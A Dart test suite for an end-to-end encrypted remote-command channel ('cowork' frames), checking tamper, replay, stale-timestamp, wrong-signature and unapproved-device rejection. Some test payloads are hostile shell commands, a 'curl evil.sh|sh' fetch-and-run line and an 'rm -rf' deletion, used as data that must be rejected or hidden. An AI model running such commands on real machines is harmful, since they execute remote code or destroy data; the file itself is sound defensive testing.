import 'dart:convert';
import 'dart:typed_data';

import 'package:cryptography/cryptography.dart';
import 'package:flutter_test/flutter_test.dart';

import 'package:chuk_chat/services/cowork/cowork_approved_devices.dart';
import 'package:chuk_chat/services/cowork/cowork_device_keys.dart';
import 'package:chuk_chat/services/cowork/cowork_frame.dart';
import 'package:chuk_chat/services/cowork/cowork_frame_codec.dart';
import 'package:chuk_chat/services/cowork/cowork_replay_guard.dart';

/// Matches a rejection with a specific reason. Asserting the *reason*, not just
/// "it threw", is what stops a test passing for the wrong cause — a frame that
/// fails to decrypt when it should have failed the signature check is a bug,
/// even though both throw.
Matcher rejects(CoworkFrameRejection rejection) => throwsA(
  isA<CoworkFrameRejectedException>().having(
    (e) => e.rejection,
    'rejection',
    rejection,
  ),
);

const String phoneId = 'phone-11111111';
const String laptopId = 'laptop-22222222';

/// A fixed clock so `ts` window tests are deterministic.
DateTime Function() clockAt(DateTime now) =>
    () => now;

void main() {
  late SecretKey accountKey;
  late SimpleKeyPair phoneKeys;
  late SimplePublicKey phonePublicKey;

  setUp(() async {
    accountKey = await AesGcm.with256bits().newSecretKey();
    phoneKeys = await CoworkDeviceKeys.generate();
    phonePublicKey = await phoneKeys.extractPublicKey();
  });

  /// A sealer for the phone, and an opener for a laptop that has locally
  /// approved the phone. The default happy path.
  Future<(CoworkFrameSealer, CoworkFrameOpener)> pair({
    DateTime Function()? sealerClock,
    DateTime Function()? openerClock,
    int nextSeq = 0,
    Duration replayWindow = const Duration(seconds: 60),
  }) async {
    final sealer = CoworkFrameSealer(
      accountKey: accountKey,
      accountKeyVersion: 1,
      deviceId: phoneId,
      signingKeyPair: phoneKeys,
      nextSeq: nextSeq,
      clock: sealerClock,
    );
    final approved = CoworkApprovedDevices.empty()
      ..approve(phoneId, phonePublicKey);
    final opener = CoworkFrameOpener(
      accountKey: accountKey,
      accountKeyVersion: 1,
      approvedDevices: approved,
      replayWindow: replayWindow,
      clock: openerClock,
    );
    return (sealer, opener);
  }

  group('round-trip', () {
    test('seal then open returns the original payload', () async {
      final (sealer, opener) = await pair();
      const command = '{"kind":"run_command","cmd":"ls -la /home/user"}';

      final frame = await sealer.sealText(command);
      expect(await opener.openText(frame), command);
    });

    test('round-trips binary payloads unchanged', () async {
      final (sealer, opener) = await pair();
      final payload = Uint8List.fromList(
        List<int>.generate(4096, (i) => i % 256),
      );

      final frame = await sealer.seal(payload);
      expect(await opener.open(frame), payload);
    });

    test('round-trips an empty payload', () async {
      final (sealer, opener) = await pair();

      final frame = await sealer.seal(const <int>[]);
      expect(await opener.open(frame), isEmpty);
    });

    test('survives a JSON wire hop', () async {
      final (sealer, opener) = await pair();
      const command = '{"kind":"ping"}';

      final sent = await sealer.sealText(command);
      // Exactly what the relay stores and forwards.
      final received = CoworkFrame.fromJsonString(sent.toJsonString());

      expect(await opener.openText(received), command);
    });

    test('the relay never sees plaintext', () async {
      final (sealer, _) = await pair();
      const secret = 'rm -rf /home/user/very-secret-directory';

      final onTheWire = (await sealer.sealText(secret)).toJsonString();

      expect(onTheWire, isNot(contains('secret')));
      expect(onTheWire, isNot(contains('rm -rf')));
      // Only the routing metadata a blind relay legitimately needs.
      final json = jsonDecode(onTheWire) as Map<String, dynamic>;
      expect(json.keys.toSet(), {
        'v',
        'kv',
        'device_id',
        'seq',
        'ts',
        'nonce',
        'ciphertext',
        'sig',
      });
    });

    test('consecutive frames use fresh nonces and rising seq', () async {
      final (sealer, opener) = await pair();

      final first = await sealer.sealText('one');
      final second = await sealer.sealText('two');

      expect(second.seq, greaterThan(first.seq));
      expect(second.nonce, isNot(first.nonce));
      expect(await opener.openText(first), 'one');
      expect(await opener.openText(second), 'two');
    });

    test('a negative restored seq is rejected in release builds too', () {
      // nextSeq comes back from storage, which can be corrupt. An assert would
      // be stripped from exactly the build where that matters.
      expect(
        () => CoworkFrameSealer(
          accountKey: accountKey,
          accountKeyVersion: 1,
          deviceId: phoneId,
          signingKeyPair: phoneKeys,
          nextSeq: -1,
        ),
        throwsA(isA<ArgumentError>()),
      );
    });

    test('sealer resumes its seq counter after a restart', () async {
      final (_, opener) = await pair();
      // A daemon restart rehydrates nextSeq from storage; starting over at 0
      // would make every frame look like a replay to the peer.
      final resumed = CoworkFrameSealer(
        accountKey: accountKey,
        accountKeyVersion: 1,
        deviceId: phoneId,
        signingKeyPair: phoneKeys,
        nextSeq: 500,
      );

      final frame = await resumed.sealText('after restart');

      expect(frame.seq, 500);
      expect(resumed.nextSeq, 501);
      expect(await opener.openText(frame), 'after restart');
    });
  });

  group('tamper -> reject', () {
    test('a flipped ciphertext byte is rejected', () async {
      final (sealer, opener) = await pair();
      final frame = await sealer.sealText('{"kind":"run_command","cmd":"ls"}');

      final mangled = Uint8List.fromList(frame.ciphertext);
      mangled[0] ^= 0x01;
      final tampered = CoworkFrame(
        deviceId: frame.deviceId,
        seq: frame.seq,
        ts: frame.ts,
        nonce: frame.nonce,
        ciphertext: mangled,
        sig: frame.sig,
      );

      // Caught by the signature: the sig covers the ciphertext, so the cheap
      // gate fires before AES-GCM is ever asked to do work.
      await expectLater(
        opener.open(tampered),
        rejects(CoworkFrameRejection.badSignature),
      );
    });

    test(
      'a flipped ciphertext byte is rejected even with a valid signature',
      () async {
        // The relay cannot re-sign, but this isolates the AEAD from the signature
        // gate: strip the outer defence and the inner one must still hold.
        final (sealer, opener) = await pair();
        final frame = await sealer.sealText(
          '{"kind":"run_command","cmd":"ls"}',
        );

        final mangled = Uint8List.fromList(frame.ciphertext);
        mangled[0] ^= 0x01;
        final resigned = await _resign(
          frame: frame,
          ciphertext: mangled,
          keyPair: phoneKeys,
        );

        await expectLater(
          opener.open(resigned),
          rejects(CoworkFrameRejection.decryptionFailed),
        );
      },
    );

    test('a flipped GCM tag byte is rejected', () async {
      final (sealer, opener) = await pair();
      final frame = await sealer.sealText('payload');

      final mangled = Uint8List.fromList(frame.ciphertext);
      mangled[mangled.length - 1] ^= 0x80;
      final resigned = await _resign(
        frame: frame,
        ciphertext: mangled,
        keyPair: phoneKeys,
      );

      await expectLater(
        opener.open(resigned),
        rejects(CoworkFrameRejection.decryptionFailed),
      );
    });

    test('a swapped nonce is rejected', () async {
      final (sealer, opener) = await pair();
      final frame = await sealer.sealText('payload');
      final other = await sealer.sealText('other');

      final swapped = CoworkFrame(
        deviceId: frame.deviceId,
        seq: frame.seq,
        ts: frame.ts,
        nonce: other.nonce,
        ciphertext: frame.ciphertext,
        sig: frame.sig,
      );

      await expectLater(
        opener.open(swapped),
        rejects(CoworkFrameRejection.badSignature),
      );
    });

    test('a rewritten seq is rejected — the header is signed', () async {
      final (sealer, opener) = await pair();
      final frame = await sealer.sealText('payload');

      final renumbered = CoworkFrame(
        deviceId: frame.deviceId,
        seq: frame.seq + 99,
        ts: frame.ts,
        nonce: frame.nonce,
        ciphertext: frame.ciphertext,
        sig: frame.sig,
      );

      await expectLater(
        opener.open(renumbered),
        rejects(CoworkFrameRejection.badSignature),
      );
    });

    test(
      'a ciphertext transplanted onto a fresh header fails the AEAD',
      () async {
        // Belt and braces: even an attacker who somehow signs (a stolen device
        // key) cannot lift yesterday's ciphertext onto a new seq/ts, because the
        // header is AAD. This is the check that makes the AAD binding earn its
        // place rather than being decoration.
        final (sealer, opener) = await pair();
        final frame = await sealer.sealText('the original command');

        final transplanted = await _resign(
          frame: CoworkFrame(
            deviceId: frame.deviceId,
            seq: frame.seq + 1,
            ts: frame.ts,
            nonce: frame.nonce,
            ciphertext: frame.ciphertext,
            sig: frame.sig,
          ),
          ciphertext: frame.ciphertext,
          keyPair: phoneKeys,
        );

        await expectLater(
          opener.open(transplanted),
          rejects(CoworkFrameRejection.decryptionFailed),
        );
      },
    );

    test('a frame sealed under a different account key is rejected', () async {
      final (_, opener) = await pair();
      final foreignKey = await AesGcm.with256bits().newSecretKey();
      final foreignSealer = CoworkFrameSealer(
        accountKey: foreignKey,
        accountKeyVersion: 1,
        deviceId: phoneId,
        signingKeyPair: phoneKeys,
      );

      final frame = await foreignSealer.sealText('payload');

      // Signature is genuine — the device key is real — but the payload is
      // sealed to another account. Fails closed at the AEAD.
      await expectLater(
        opener.open(frame),
        rejects(CoworkFrameRejection.decryptionFailed),
      );
    });
  });

  group('replay -> reject', () {
    test('the same frame replayed is rejected', () async {
      final (sealer, opener) = await pair();
      final frame = await sealer.sealText('{"kind":"run_command","cmd":"ls"}');

      expect(await opener.openText(frame), '{"kind":"run_command","cmd":"ls"}');

      await expectLater(
        opener.open(frame),
        rejects(CoworkFrameRejection.replayedSequence),
      );
    });

    test('the same seq re-used with fresh bytes is rejected', () async {
      // A hostile relay cannot forge, but the real peer must not be able to
      // burn a seq twice either — the counter is the invariant, not the bytes.
      final (_, opener) = await pair();
      final a = CoworkFrameSealer(
        accountKey: accountKey,
        accountKeyVersion: 1,
        deviceId: phoneId,
        signingKeyPair: phoneKeys,
        nextSeq: 7,
      );
      final b = CoworkFrameSealer(
        accountKey: accountKey,
        accountKeyVersion: 1,
        deviceId: phoneId,
        signingKeyPair: phoneKeys,
        nextSeq: 7,
      );

      expect(await opener.openText(await a.sealText('first')), 'first');
      await expectLater(
        opener.open(await b.sealText('second')),
        rejects(CoworkFrameRejection.replayedSequence),
      );
    });

    test('an out-of-order lower seq is rejected', () async {
      final (sealer, opener) = await pair();
      final first = await sealer.sealText('one');
      final second = await sealer.sealText('two');

      expect(await opener.openText(second), 'two');

      // The relay may reorder; the executor must not run the older frame after
      // the newer one.
      await expectLater(
        opener.open(first),
        rejects(CoworkFrameRejection.replayedSequence),
      );
    });

    test('a gap in seq is accepted — the relay may drop, not forge', () async {
      final (_, opener) = await pair();
      final sealer = CoworkFrameSealer(
        accountKey: accountKey,
        accountKeyVersion: 1,
        deviceId: phoneId,
        signingKeyPair: phoneKeys,
        nextSeq: 100,
      );

      expect(await opener.openText(await sealer.sealText('a')), 'a');
      await sealer.seal(const <int>[]); // sealed, then dropped in flight
      expect(await opener.openText(await sealer.sealText('c')), 'c');
    });

    test('replay state survives a restart via lastSeqByDevice', () async {
      final (sealer, opener) = await pair();
      final frame = await sealer.sealText('payload');
      expect(await opener.openText(frame), 'payload');

      final persisted = opener.lastSeqByDevice;
      expect(persisted, {phoneId: frame.seq});

      // A daemon restart that forgot its counters would happily re-run every
      // captured frame inside the ts window.
      final approved = CoworkApprovedDevices.empty()
        ..approve(phoneId, phonePublicKey);
      final restarted = CoworkFrameOpener(
        accountKey: accountKey,
        accountKeyVersion: 1,
        approvedDevices: approved,
        lastSeqByDevice: persisted,
      );

      await expectLater(
        restarted.open(frame),
        rejects(CoworkFrameRejection.replayedSequence),
      );
    });

    test('each device has its own seq stream', () async {
      final tabletKeys = await CoworkDeviceKeys.generate();
      const tabletId = 'tablet-33333333';
      final approved = CoworkApprovedDevices.empty()
        ..approve(phoneId, phonePublicKey)
        ..approve(tabletId, await tabletKeys.extractPublicKey());
      final opener = CoworkFrameOpener(
        accountKey: accountKey,
        accountKeyVersion: 1,
        approvedDevices: approved,
      );
      final phone = CoworkFrameSealer(
        accountKey: accountKey,
        accountKeyVersion: 1,
        deviceId: phoneId,
        signingKeyPair: phoneKeys,
        nextSeq: 5,
      );
      final tablet = CoworkFrameSealer(
        accountKey: accountKey,
        accountKeyVersion: 1,
        deviceId: tabletId,
        signingKeyPair: tabletKeys,
        nextSeq: 5,
      );

      expect(
        await opener.openText(await phone.sealText('from phone')),
        'from phone',
      );
      // Same seq, different device: must not be mistaken for a replay.
      expect(
        await opener.openText(await tablet.sealText('from tablet')),
        'from tablet',
      );
    });
  });

  group('stale ts -> reject', () {
    final now = DateTime.utc(2026, 7, 17, 12, 0, 0);

    test('a frame older than the window is rejected', () async {
      final (sealer, opener) = await pair(
        sealerClock: clockAt(now.subtract(const Duration(seconds: 61))),
        openerClock: clockAt(now),
      );

      await expectLater(
        opener.open(await sealer.sealText('banked yesterday')),
        rejects(CoworkFrameRejection.timestampOutOfWindow),
      );
    });

    test('a frame far in the future is rejected', () async {
      // Symmetry matters: accepting the future would let an attacker bank
      // frames to replay after the window closes.
      final (sealer, opener) = await pair(
        sealerClock: clockAt(now.add(const Duration(seconds: 61))),
        openerClock: clockAt(now),
      );

      await expectLater(
        opener.open(await sealer.sealText('from the future')),
        rejects(CoworkFrameRejection.timestampOutOfWindow),
      );
    });

    test('a frame just inside the window is accepted', () async {
      final (sealer, opener) = await pair(
        sealerClock: clockAt(now.subtract(const Duration(seconds: 59))),
        openerClock: clockAt(now),
      );

      expect(await opener.openText(await sealer.sealText('fresh')), 'fresh');
    });

    test('the window is configurable', () async {
      final (sealer, opener) = await pair(
        sealerClock: clockAt(now.subtract(const Duration(seconds: 30))),
        openerClock: clockAt(now),
        replayWindow: const Duration(seconds: 10),
      );

      await expectLater(
        opener.open(await sealer.sealText('too old for this window')),
        rejects(CoworkFrameRejection.timestampOutOfWindow),
      );
    });

    test('a stale frame does not burn the seq counter', () async {
      // A rejected-for-staleness frame must not leave state that blocks the
      // peer's next legitimate frame.
      final sealer = CoworkFrameSealer(
        accountKey: accountKey,
        accountKeyVersion: 1,
        deviceId: phoneId,
        signingKeyPair: phoneKeys,
        clock: clockAt(now.subtract(const Duration(seconds: 61))),
      );
      final approved = CoworkApprovedDevices.empty()
        ..approve(phoneId, phonePublicKey);
      final opener = CoworkFrameOpener(
        accountKey: accountKey,
        accountKeyVersion: 1,
        approvedDevices: approved,
        clock: clockAt(now),
      );

      await expectLater(
        opener.open(await sealer.sealText('stale')),
        rejects(CoworkFrameRejection.timestampOutOfWindow),
      );
      expect(opener.lastSeqByDevice, isEmpty);
    });
  });

  group('wrong-device signature -> reject', () {
    test('a frame signed by another device key is rejected', () async {
      // The attacker holds a real Ed25519 key and claims the phone's device id.
      // Only the locally approved key can vouch for that id.
      final (_, opener) = await pair();
      final impostorKeys = await CoworkDeviceKeys.generate();
      final impostor = CoworkFrameSealer(
        accountKey: accountKey,
        accountKeyVersion: 1,
        deviceId: phoneId,
        signingKeyPair: impostorKeys,
      );

      await expectLater(
        opener.open(
          await impostor.sealText('{"kind":"run_command","cmd":"whoami"}'),
        ),
        rejects(CoworkFrameRejection.badSignature),
      );
    });

    test('a signature lifted from another frame is rejected', () async {
      final (sealer, opener) = await pair();
      final donor = await sealer.sealText('donor');
      final target = await sealer.sealText('target');

      final grafted = CoworkFrame(
        deviceId: target.deviceId,
        seq: target.seq,
        ts: target.ts,
        nonce: target.nonce,
        ciphertext: target.ciphertext,
        sig: donor.sig,
      );

      await expectLater(
        opener.open(grafted),
        rejects(CoworkFrameRejection.badSignature),
      );
    });

    test('a device id swapped to an approved peer is rejected', () async {
      // The laptop approves two devices; a frame from one relabelled as the
      // other must fail — device id is inside the signed header.
      final tabletKeys = await CoworkDeviceKeys.generate();
      const tabletId = 'tablet-33333333';
      final approved = CoworkApprovedDevices.empty()
        ..approve(phoneId, phonePublicKey)
        ..approve(tabletId, await tabletKeys.extractPublicKey());
      final opener = CoworkFrameOpener(
        accountKey: accountKey,
        accountKeyVersion: 1,
        approvedDevices: approved,
      );
      final phone = CoworkFrameSealer(
        accountKey: accountKey,
        accountKeyVersion: 1,
        deviceId: phoneId,
        signingKeyPair: phoneKeys,
      );

      final frame = await phone.sealText('payload');
      final relabelled = CoworkFrame(
        deviceId: tabletId,
        seq: frame.seq,
        ts: frame.ts,
        nonce: frame.nonce,
        ciphertext: frame.ciphertext,
        sig: frame.sig,
      );

      await expectLater(
        opener.open(relabelled),
        rejects(CoworkFrameRejection.badSignature),
      );
    });

    test('an all-zero signature is rejected', () async {
      final (sealer, opener) = await pair();
      final frame = await sealer.sealText('payload');

      final unsigned = CoworkFrame(
        deviceId: frame.deviceId,
        seq: frame.seq,
        ts: frame.ts,
        nonce: frame.nonce,
        ciphertext: frame.ciphertext,
        sig: Uint8List(kCoworkFrameSignatureLength),
      );

      await expectLater(
        opener.open(unsigned),
        rejects(CoworkFrameRejection.badSignature),
      );
    });
  });

  group('local approval is the trust boundary', () {
    test(
      'a frame signed by a key NOT in the local approved set is rejected',
      () async {
        // The server can say whatever it likes about this device; the executor
        // has never recorded its key, so the frame dies before verification.
        final rogueKeys = await CoworkDeviceKeys.generate();
        const rogueId = 'rogue-99999999';
        final approved = CoworkApprovedDevices.empty()
          ..approve(phoneId, phonePublicKey);
        final opener = CoworkFrameOpener(
          accountKey: accountKey,
          accountKeyVersion: 1,
          approvedDevices: approved,
        );
        final rogue = CoworkFrameSealer(
          accountKey: accountKey,
          accountKeyVersion: 1,
          deviceId: rogueId,
          signingKeyPair: rogueKeys,
        );

        await expectLater(
          opener.open(
            await rogue.sealText(
              '{"kind":"run_command","cmd":"curl evil.sh|sh"}',
            ),
          ),
          rejects(CoworkFrameRejection.deviceNotApproved),
        );
      },
    );

    test('a frame signed by an approved key is accepted', () async {
      final approved = CoworkApprovedDevices.empty()
        ..approve(phoneId, phonePublicKey);
      final opener = CoworkFrameOpener(
        accountKey: accountKey,
        accountKeyVersion: 1,
        approvedDevices: approved,
      );
      final sealer = CoworkFrameSealer(
        accountKey: accountKey,
        accountKeyVersion: 1,
        deviceId: phoneId,
        signingKeyPair: phoneKeys,
      );

      expect(
        await opener.openText(await sealer.sealText('approved')),
        'approved',
      );
    });

    test(
      'an empty local approved set rejects everything — default deny',
      () async {
        // The whole point: a fresh desktop trusts nobody. There is no code path
        // that consults the server's flag, so a compromised backend has nothing
        // to flip.
        final opener = CoworkFrameOpener(
          accountKey: accountKey,
          accountKeyVersion: 1,
          approvedDevices: CoworkApprovedDevices.empty(),
        );
        final sealer = CoworkFrameSealer(
          accountKey: accountKey,
          accountKeyVersion: 1,
          deviceId: phoneId,
          signingKeyPair: phoneKeys,
        );

        expect(opener.approvedDevices.isEmpty, isTrue);
        await expectLater(
          opener.open(await sealer.sealText('let me in')),
          rejects(CoworkFrameRejection.deviceNotApproved),
        );
      },
    );

    test(
      'an otherwise perfect frame is rejected once the device is revoked',
      () async {
        final (sealer, opener) = await pair();
        expect(
          await opener.openText(await sealer.sealText('before')),
          'before',
        );

        expect(opener.approvedDevices.revoke(phoneId), isTrue);

        await expectLater(
          opener.open(await sealer.sealText('after')),
          rejects(CoworkFrameRejection.deviceNotApproved),
        );
      },
    );

    test('revokeAll wipes the trust store — the tray panic switch', () async {
      final (sealer, opener) = await pair();
      opener.approvedDevices.revokeAll();

      await expectLater(
        opener.open(await sealer.sealText('after panic')),
        rejects(CoworkFrameRejection.deviceNotApproved),
      );
    });

    test('approval is checked before signature verification', () async {
      // Order matters: an unapproved device must not even get its signature
      // checked, and must not be told the difference between "not approved"
      // and "bad key".
      final rogueKeys = await CoworkDeviceKeys.generate();
      final opener = CoworkFrameOpener(
        accountKey: accountKey,
        accountKeyVersion: 1,
        approvedDevices: CoworkApprovedDevices.empty(),
      );
      final rogue = CoworkFrameSealer(
        accountKey: accountKey,
        accountKeyVersion: 1,
        deviceId: 'rogue-99999999',
        signingKeyPair: rogueKeys,
      );
      final frame = await rogue.sealText('payload');
      // Genuinely signed by the key it claims — only approval separates it.
      final mangled = CoworkFrame(
        deviceId: frame.deviceId,
        seq: frame.seq,
        ts: frame.ts,
        nonce: frame.nonce,
        ciphertext: frame.ciphertext,
        sig: Uint8List(kCoworkFrameSignatureLength),
      );

      await expectLater(
        opener.open(mangled),
        rejects(CoworkFrameRejection.deviceNotApproved),
      );
    });
  });

  group('key version', () {
    test('a frame tagged with a key version we do not hold is rejected',
        () async {
      // kv is signed and bound into the AEAD, so only the peer itself can set
      // it — but an authenticated field that is read and never checked is a
      // trap. We hold one key; anything else cannot be opened.
      final approved = CoworkApprovedDevices.empty()
        ..approve(phoneId, phonePublicKey);
      final opener = CoworkFrameOpener(
        accountKey: accountKey,
        accountKeyVersion: 2,
        approvedDevices: approved,
      );
      final staleSealer = CoworkFrameSealer(
        accountKey: accountKey,
        accountKeyVersion: 1, // drifted across a password rotation
        deviceId: phoneId,
        signingKeyPair: phoneKeys,
      );

      await expectLater(
        opener.open(await staleSealer.sealText('from before the rotation')),
        rejects(CoworkFrameRejection.keyVersionMismatch),
      );
    });

    test('a rewritten kv is caught by the signature, not the version check',
        () async {
      // The header is signed, so kv is not attacker-malleable. This pins that
      // the cheaper check never becomes the *only* thing standing between a
      // relay and a forged version tag.
      final (sealer, opener) = await pair();
      final frame = await sealer.sealText('payload');

      final relabelled = CoworkFrame(
        version: frame.version,
        keyVersion: 99,
        deviceId: frame.deviceId,
        seq: frame.seq,
        ts: frame.ts,
        nonce: frame.nonce,
        ciphertext: frame.ciphertext,
        sig: frame.sig,
      );

      await expectLater(
        opener.open(relabelled),
        rejects(CoworkFrameRejection.badSignature),
      );
    });

    test('a matching key version opens normally', () async {
      final approved = CoworkApprovedDevices.empty()
        ..approve(phoneId, phonePublicKey);
      final opener = CoworkFrameOpener(
        accountKey: accountKey,
        accountKeyVersion: 7,
        approvedDevices: approved,
      );
      final sealer = CoworkFrameSealer(
        accountKey: accountKey,
        accountKeyVersion: 7,
        deviceId: phoneId,
        signingKeyPair: phoneKeys,
      );

      expect(await opener.openText(await sealer.sealText('rotated')), 'rotated');
    });
  });

  group('malformed frames', () {
    test('unsupported version is rejected', () {
      expect(
        () => CoworkFrame.fromJsonString(
          jsonEncode({
            'v': '99',
            'kv': 1,
            'device_id': phoneId,
            'seq': 0,
            'ts': 0,
            'nonce': base64Encode(Uint8List(kCoworkFrameNonceLength)),
            'ciphertext': base64Encode(Uint8List(32)),
            'sig': base64Encode(Uint8List(kCoworkFrameSignatureLength)),
          }),
        ),
        rejects(CoworkFrameRejection.unsupportedVersion),
      );
    });

    test('invalid JSON is a rejection, not a FormatException', () {
      expect(
        () => CoworkFrame.fromJsonString('not json at all'),
        rejects(CoworkFrameRejection.malformed),
      );
    });

    test('a JSON array is rejected', () {
      expect(
        () => CoworkFrame.fromJsonString('[1,2,3]'),
        rejects(CoworkFrameRejection.malformed),
      );
    });

    test('a wrong-length nonce is rejected', () async {
      final (sealer, _) = await pair();
      final json = (await sealer.sealText('payload')).toJson();
      json['nonce'] = base64Encode(Uint8List(8));

      expect(
        () => CoworkFrame.fromJson(json),
        rejects(CoworkFrameRejection.malformed),
      );
    });

    test('a wrong-length signature is rejected', () async {
      final (sealer, _) = await pair();
      final json = (await sealer.sealText('payload')).toJson();
      json['sig'] = base64Encode(Uint8List(32));

      expect(
        () => CoworkFrame.fromJson(json),
        rejects(CoworkFrameRejection.malformed),
      );
    });

    test('a ciphertext shorter than the GCM tag is rejected', () async {
      final (sealer, _) = await pair();
      final json = (await sealer.sealText('payload')).toJson();
      json['ciphertext'] = base64Encode(Uint8List(4));

      expect(
        () => CoworkFrame.fromJson(json),
        rejects(CoworkFrameRejection.malformed),
      );
    });

    test('non-base64 fields are rejected', () async {
      final (sealer, _) = await pair();
      final json = (await sealer.sealText('payload')).toJson();
      json['nonce'] = 'not!base64!';

      expect(
        () => CoworkFrame.fromJson(json),
        rejects(CoworkFrameRejection.malformed),
      );
    });

    test('a negative seq is rejected', () async {
      final (sealer, _) = await pair();
      final json = (await sealer.sealText('payload')).toJson();
      json['seq'] = -1;

      expect(
        () => CoworkFrame.fromJson(json),
        rejects(CoworkFrameRejection.malformed),
      );
    });

    test('missing fields are rejected', () async {
      final (sealer, _) = await pair();
      for (final field in [
        'v',
        'kv',
        'device_id',
        'seq',
        'ts',
        'nonce',
        'ciphertext',
        'sig',
      ]) {
        final json = (await sealer.sealText('payload')).toJson()..remove(field);
        expect(
          () => CoworkFrame.fromJson(json),
          rejects(CoworkFrameRejection.malformed),
          reason: 'missing $field must be rejected',
        );
      }
    });
  });

  group('header canonicalisation', () {
    test('golden: the exact header bytes are pinned', () {
      // A golden vector, hand-computed rather than recorded from the code.
      // Everything above only proves that different inputs give different
      // bytes — which stays true if field order, prefix width or endianness
      // all change at once. Producer and consumer would then regress together
      // and every round-trip test would still pass, while frames from an older
      // build stopped verifying. This is the test that makes the wire format
      // a contract instead of an implementation detail.
      final header = CoworkFrame.buildHeaderBytes(
        version: '1',
        keyVersion: 1,
        deviceId: 'ab',
        seq: 7,
        ts: 1700000000000,
      );

      const expected =
          // 4-byte big-endian length, then the bytes, for each field in order:
          '00000011' // len 17
          '6368756b2e636f776f726b2e6672616d65' // "chuk.cowork.frame"
          '00000001' '31' // version "1"
          '00000001' '31' // keyVersion "1"
          '00000002' '6162' // deviceId "ab"
          '00000001' '37' // seq "7"
          '0000000d' '31373030303030303030303030'; // ts "1700000000000"

      expect(_hex(header), expected);
    });

    test('golden: length prefixes count bytes, not characters', () {
      // A multibyte device id must be prefixed with its UTF-8 byte length. Get
      // this wrong and two devices can collide, or the header stops parsing.
      final header = CoworkFrame.buildHeaderBytes(
        version: '1',
        keyVersion: 1,
        deviceId: 'phöne', // 5 characters, 6 UTF-8 bytes
        seq: 0,
        ts: 0,
      );

      expect(_hex(header), contains('00000006' '7068c3b66e65'));
    });

    test('length-prefixing stops adjacent fields being confused', () {
      // The genuine collision: without length prefixes, deviceId 'a' + seq 12
      // and deviceId 'a1' + seq 2 both concatenate to "a12", so one signature
      // would cover two different frames.
      final a = CoworkFrame.buildHeaderBytes(
        version: kCoworkFrameVersion,
        keyVersion: 1,
        deviceId: 'a',
        seq: 12,
        ts: 100,
      );
      final b = CoworkFrame.buildHeaderBytes(
        version: kCoworkFrameVersion,
        keyVersion: 1,
        deviceId: 'a1',
        seq: 2,
        ts: 100,
      );
      expect(a, isNot(b));
    });

    test('the version is part of the signed header', () {
      // A frame from a future format must not verify under this one.
      final a = CoworkFrame.buildHeaderBytes(
        version: '1',
        keyVersion: 1,
        deviceId: phoneId,
        seq: 1,
        ts: 100,
      );
      final b = CoworkFrame.buildHeaderBytes(
        version: '2',
        keyVersion: 1,
        deviceId: phoneId,
        seq: 1,
        ts: 100,
      );
      expect(a, isNot(b));
    });

    test('every header field changes the bytes', () {
      Uint8List header({
        int keyVersion = 1,
        String deviceId = phoneId,
        int seq = 1,
        int ts = 100,
      }) => CoworkFrame.buildHeaderBytes(
        version: kCoworkFrameVersion,
        keyVersion: keyVersion,
        deviceId: deviceId,
        seq: seq,
        ts: ts,
      );

      final base = header();
      expect(header(keyVersion: 2), isNot(base));
      expect(header(deviceId: laptopId), isNot(base));
      expect(header(seq: 2), isNot(base));
      expect(header(ts: 101), isNot(base));
      expect(header(), base);
    });
  });

  group('replay guard', () {
    test('accepts any seq as the first frame from a device', () {
      final guard = CoworkReplayGuard();
      final frame = _frameAt(seq: 900, ts: DateTime.now());

      expect(guard.lastSeq, isNull);
      guard.check(frame);
      guard.commit(frame);

      expect(guard.lastSeq, 900);
    });

    test('rejects seq equal to the last accepted', () {
      final now = DateTime.utc(2026, 7, 17);
      final guard = CoworkReplayGuard(clock: clockAt(now), lastSeq: 10);
      expect(
        () => guard.check(_frameAt(seq: 10, ts: now)),
        rejects(CoworkFrameRejection.replayedSequence),
      );
    });

    test('checks ts before seq', () {
      // A stale frame must not advance the counter on its way out.
      final now = DateTime.utc(2026, 7, 17);
      final guard = CoworkReplayGuard(clock: clockAt(now));
      expect(
        () => guard.check(
          _frameAt(seq: 5, ts: now.subtract(const Duration(minutes: 5))),
        ),
        rejects(CoworkFrameRejection.timestampOutOfWindow),
      );
      expect(guard.lastSeq, isNull);
    });

    test('check does not advance the counter', () {
      // check() is side-effect free so a frame that later fails to decrypt
      // leaves no trace.
      final now = DateTime.utc(2026, 7, 17);
      final guard = CoworkReplayGuard(clock: clockAt(now));

      guard.check(_frameAt(seq: 3, ts: now));
      guard.check(_frameAt(seq: 3, ts: now));

      expect(guard.lastSeq, isNull);
    });

    test('commit re-checks ts, so a frame cannot expire mid-decryption', () {
      // check() and commit() straddle the decryption await. A frame that was
      // fresh at check but stale by commit must not be delivered.
      final now = DateTime.utc(2026, 7, 17, 12, 0, 0);
      var clock = now;
      final guard = CoworkReplayGuard(clock: () => clock);
      final frame = _frameAt(seq: 1, ts: now);

      guard.check(frame);
      clock = now.add(const Duration(seconds: 61)); // decryption took a while

      expect(
        () => guard.commit(frame),
        rejects(CoworkFrameRejection.timestampOutOfWindow),
      );
      expect(guard.lastSeq, isNull);
    });

    test('commit re-validates, so two concurrent frames cannot both land', () {
      // check() and commit() straddle the decryption await. Two frames with the
      // same seq can both pass check; only one may commit.
      final now = DateTime.utc(2026, 7, 17);
      final guard = CoworkReplayGuard(clock: clockAt(now));
      final a = _frameAt(seq: 4, ts: now);
      final b = _frameAt(seq: 4, ts: now);

      guard.check(a);
      guard.check(b);
      guard.commit(a);

      expect(
        () => guard.commit(b),
        rejects(CoworkFrameRejection.replayedSequence),
      );
      expect(guard.lastSeq, 4);
    });
  });

  group('a frame that fails to decrypt does not burn the seq', () {
    test('a later legitimate frame with the same seq still opens', () async {
      // Only frames actually delivered to the executor may consume a sequence
      // number. A frame that dies at the AEAD was never delivered.
      final (_, opener) = await pair();
      final foreignKey = await AesGcm.with256bits().newSecretKey();
      final foreignSealer = CoworkFrameSealer(
        accountKey: foreignKey,
        accountKeyVersion: 1,
        deviceId: phoneId,
        signingKeyPair: phoneKeys,
      );

      await expectLater(
        opener.open(await foreignSealer.sealText('undecryptable')),
        rejects(CoworkFrameRejection.decryptionFailed),
      );
      expect(opener.lastSeqByDevice, isEmpty);

      // seq 0 again — must not look like a replay.
      final good = CoworkFrameSealer(
        accountKey: accountKey,
        accountKeyVersion: 1,
        deviceId: phoneId,
        signingKeyPair: phoneKeys,
      );
      expect(await opener.openText(await good.sealText('real')), 'real');
    });
  });
}

/// Lowercase hex, for golden byte-vector assertions.
String _hex(List<int> bytes) =>
    bytes.map((b) => b.toRadixString(16).padLeft(2, '0')).join();

/// Builds a frame with the given seq/ts and filler crypto material, for testing
/// the replay guard in isolation from the codec.
